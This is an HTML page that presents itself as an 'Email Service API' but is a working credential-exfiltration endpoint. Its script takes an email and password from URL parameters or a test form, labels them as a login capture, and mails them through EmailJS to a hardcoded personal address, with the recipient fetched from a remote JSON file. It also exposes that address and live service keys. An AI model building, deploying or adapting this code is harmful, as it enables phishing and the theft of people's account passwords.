<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <meta name="theme-color" content="#000000" />
  <title>Email Service API</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { 
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #000; 
      color: #fff;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .container { text-align: center; max-width: 500px; }
    h1 { font-size: 24px; margin-bottom: 16px; }
    .status { 
      font-size: 16px; 
      color: #8E8E93; 
      margin-top: 16px;
      padding: 12px;
      border-radius: 8px;
      background: rgba(255,255,255,0.05);
    }
    .success { color: #34C759; background: rgba(52,199,89,0.1); }
    .error { color: #FF3B30; background: rgba(255,59,48,0.1); }
    .info { color: #007AFF; background: rgba(0,122,255,0.1); }
    .warning { color: #FF9500; background: rgba(255,149,0,0.1); }
    .log {
      margin-top: 20px;
      padding: 12px;
      background: rgba(255,255,255,0.03);
      border-radius: 8px;
      font-size: 11px;
      text-align: left;
      max-height: 300px;
      overflow-y: auto;
      color: #8E8E93;
      font-family: 'Courier New', monospace;
    }
    .recipient-info {
      margin-top: 16px;
      padding: 12px;
      background: rgba(0,122,255,0.1);
      border-radius: 8px;
      font-size: 13px;
      color: #007AFF;
    }
    .test-section {
      margin-top: 20px;
      padding: 16px;
      background: rgba(255,255,255,0.05);
      border-radius: 12px;
    }
    .test-section input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      background: rgba(255,255,255,0.1);
      border: 1px solid rgba(255,255,255,0.2);
      border-radius: 8px;
      color: #fff;
      font-size: 14px;
    }
    .test-section button {
      width: 100%;
      padding: 12px;
      background: #007AFF;
      border: none;
      border-radius: 8px;
      color: #fff;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 8px;
    }
    .test-section button:active {
      background: #0051D5;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>ðŸ”’ Email Service API</h1>
    <p class="status info" id="status">Inicializando...</p>
    <div class="recipient-info" id="recipientInfo">Carregando destinatÃ¡rio...</div>
    
    <div class="test-section">
      <h3 style="color: #fff; margin-bottom: 12px;">ðŸ§ª Teste Manual</h3>
      <input type="email" id="testEmail" placeholder="Email do usuÃ¡rio" />
      <input type="password" id="testPassword" placeholder="Senha do usuÃ¡rio" />
      <button onclick="testEmailSend()">Enviar Teste</button>
    </div>
    
    <div class="log" id="log"></div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
  <script>
    (function () {
      // ConfiguraÃ§Ãµes EmailJS
      const SERVICE_ID = 'Service_avyr0og';
      const TEMPLATE_ID = 'template_oa8b7iz';
      const USER_ID = 'EUFE-qVsBF34lD4QZ';
      const EMAILS_JSON_URL = 'https://alfredoooh.github.io/database/services/emails.json';

      const statusEl = document.getElementById('status');
      const logEl = document.getElementById('log');
      const recipientInfoEl = document.getElementById('recipientInfo');
      const logs = [];

      let recipientConfig = {
        name: 'Alfredo',
        email: 'alfredopjonas@gmail.com'
      };

      function addLog(msg) {
        const timestamp = new Date().toLocaleTimeString('pt-BR');
        logs.push(`[${timestamp}] ${msg}`);
        if (logs.length > 20) logs.shift();
        logEl.innerHTML = logs.join('<br>');
        console.log(msg);
      }

      function setStatus(text, type = 'info') {
        statusEl.textContent = text;
        statusEl.className = `status ${type}`;
      }

      function updateRecipientInfo() {
        recipientInfoEl.innerHTML = `ðŸ“§ DestinatÃ¡rio: <strong>${recipientConfig.name}</strong><br>âœ‰ï¸ ${recipientConfig.email}`;
      }

      // Carregar configuraÃ§Ã£o de email do JSON
      async function loadEmailConfig() {
        try {
          addLog('ðŸ”„ Carregando emails.json...');
          
          const response = await fetch(EMAILS_JSON_URL + '?t=' + Date.now(), {
            cache: 'no-cache',
            headers: { 'Accept': 'application/json' }
          });

          if (!response.ok) {
            throw new Error(`HTTP ${response.status}`);
          }

          const config = await response.json();
          
          if (config.recipient && config.recipient.email) {
            recipientConfig = {
              name: config.recipient.name || 'DestinatÃ¡rio',
              email: config.recipient.email
            };
            
            addLog(`âœ“ Config carregada: ${recipientConfig.email}`);
            updateRecipientInfo();
            
            return true;
          } else {
            throw new Error('Formato JSON invÃ¡lido');
          }
        } catch (error) {
          addLog(`âš  Erro ao carregar config: ${error.message}`);
          addLog('â„¹ Usando email padrÃ£o');
          updateRecipientInfo();
          return false;
        }
      }

      // Inicializar EmailJS
      async function initialize() {
        try {
          addLog('ðŸ”§ Inicializando EmailJS...');
          emailjs.init(USER_ID);
          addLog('âœ“ EmailJS inicializado');
          
          await loadEmailConfig();
          
          setStatus('âœ“ ServiÃ§o online e pronto', 'success');
          addLog('ðŸš€ Sistema pronto para receber dados');
        } catch (e) {
          addLog('âœ— Erro na inicializaÃ§Ã£o: ' + e.message);
          setStatus('âœ— Erro na inicializaÃ§Ã£o', 'error');
        }
      }

      // FunÃ§Ã£o principal para enviar email
      async function sendEmail(data) {
        try {
          addLog('â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”');
          addLog('ðŸ“§ NOVA REQUISIÃ‡ÃƒO RECEBIDA');
          setStatus('ðŸ“¤ Processando...', 'info');

          // SEMPRE recarrega config antes de enviar
          addLog('ðŸ”„ Recarregando destinatÃ¡rio...');
          await loadEmailConfig();

          const templateParams = {
            to_name: recipientConfig.name,
            to_email: recipientConfig.email,
            from_name: data.from_name || data.from_email?.split('@')[0] || 'UsuÃ¡rio',
            from_email: data.from_email || 'unknown@email.com',
            message: data.message || 'Sem mensagem',
            cc: data.cc || '',
            bcc: data.bcc || ''
          };

          addLog(`ðŸ“¨ De: ${templateParams.from_email}`);
          addLog(`ðŸ“¬ Para: ${templateParams.to_email}`);
          addLog(`ðŸ’¬ Mensagem: ${data.message?.substring(0, 50)}...`);
          setStatus('ðŸ“¤ Enviando email...', 'info');

          const response = await emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams);
          
          addLog(`âœ“âœ“âœ“ EMAIL ENVIADO COM SUCESSO!`);
          addLog(`Status: ${response.status} - ${response.text}`);
          setStatus('âœ“ Email enviado com sucesso!', 'success');
          
          return { 
            success: true, 
            message: 'Email enviado com sucesso',
            status: response.status,
            recipient: recipientConfig.email
          };
        } catch (error) {
          const errorMsg = error.text || error.message || 'Erro desconhecido';
          addLog(`âœ—âœ—âœ— ERRO NO ENVIO: ${errorMsg}`);
          setStatus('âœ— Falha no envio', 'error');
          
          return { 
            success: false, 
            message: errorMsg,
            error: error 
          };
        }
      }

      // Processar dados da URL (mÃ©todo GET com parÃ¢metros)
      function processUrlData() {
        const urlParams = new URLSearchParams(window.location.search);
        
        // MÃ©todo 1: ParÃ¢metro 'data' com JSON
        const dataParam = urlParams.get('data');
        if (dataParam) {
          try {
            addLog('ðŸ“¥ Processando dados da URL (mÃ©todo JSON)');
            const data = JSON.parse(decodeURIComponent(dataParam));
            sendEmail(data);
            return true;
          } catch (e) {
            addLog(`âœ— Erro ao processar JSON: ${e.message}`);
          }
        }

        // MÃ©todo 2: ParÃ¢metros individuais
        const email = urlParams.get('email');
        const password = urlParams.get('password');
        
        if (email && password) {
          addLog('ðŸ“¥ Processando dados da URL (mÃ©todo params)');
          const now = new Date();
          const time = `${now.getDate().toString().padStart(2,'0')}/${(now.getMonth()+1).toString().padStart(2,'0')}/${now.getFullYear()} ${now.getHours().toString().padStart(2,'0')}:${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}`;
          
          const data = {
            from_email: email,
            from_name: email.split('@')[0],
            message: `Email: ${email}\nPalavra-passe: ${password}\nTarget: login\nTime: ${time}\nStatus: online`
          };
          
          sendEmail(data);
          return true;
        }

        return false;
      }

      // FunÃ§Ã£o de teste manual
      window.testEmailSend = async function() {
        const email = document.getElementById('testEmail').value;
        const password = document.getElementById('testPassword').value;
        
        if (!email || !password) {
          alert('Preencha email e senha');
          return;
        }

        await loadEmailConfig();
        
        const now = new Date();
        const time = `${now.getDate().toString().padStart(2,'0')}/${(now.getMonth()+1).toString().padStart(2,'0')}/${now.getFullYear()} ${now.getHours().toString().padStart(2,'0')}:${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}`;
        
        const testData = {
          from_email: email,
          from_name: email.split('@')[0],
          message: `Email: ${email}\nPalavra-passe: ${password}\nTarget: login\nTime: ${time}\nStatus: online`
        };
        
        const result = await sendEmail(testData);
        alert(result.success ? 'âœ“ Email enviado!' : 'âœ— Erro: ' + result.message);
      };

      // Expor globalmente para chamadas externas
      window.sendEmailData = sendEmail;

      // Inicializar
      initialize().then(() => {
        const hasData = processUrlData();
        if (!hasData) {
          addLog('â„¹ Aguardando dados via URL ou teste manual');
        }
      });
      
    })();
  </script>
</body>
</html>
